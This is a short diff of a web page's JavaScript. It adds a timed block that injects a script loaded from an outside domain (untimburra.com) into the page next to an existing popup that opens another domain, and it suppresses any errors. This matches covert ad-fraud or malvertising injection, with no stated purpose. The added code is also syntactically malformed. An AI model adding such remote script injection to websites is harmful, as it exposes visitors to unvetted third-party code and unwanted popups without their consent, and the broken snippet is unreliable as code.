@@ -10,9 +10,13 @@ let x=0;
 
     setTimeout(()=>{
                 window.open("//ashoupsu.com/4/4594571");
+        function(d,z,s){
+            s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)
+                                      }
+            catch(e){}})('untimburra.com',4538008,document.createElement('script');
            },5000);
 
- 
+   
 
 setTimeout(()=>{
                 window.open("//ashoupsu.com/4/4594571");
